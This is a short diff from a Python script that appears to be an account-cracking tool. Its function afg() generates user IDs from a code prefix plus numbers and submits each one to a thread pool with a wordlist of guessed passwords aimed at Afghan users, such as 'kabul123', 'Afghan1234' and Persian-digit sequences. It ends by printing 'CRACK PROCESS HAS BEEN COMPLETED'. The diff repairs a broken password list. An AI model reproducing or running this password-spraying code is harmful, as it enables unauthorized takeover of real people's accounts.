@@ -234,7 +234,7 @@ def afg():
         print('\033[1;32m')
         for love in user:
             uid = code+love
-            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800','Afghan123','Afghanistan','Afghan123','Afghan1234','10002000','Kabul123','Kabul1234','Mazar123','Appl2017,]
+            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800','Afghan123','Afghanistan','Afghan123','Afghan1234','10002000','Kabul123','Kabul1234']
             sking.submit(skingrdm,uid,pwx,tl)
     print('\033[1;32m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
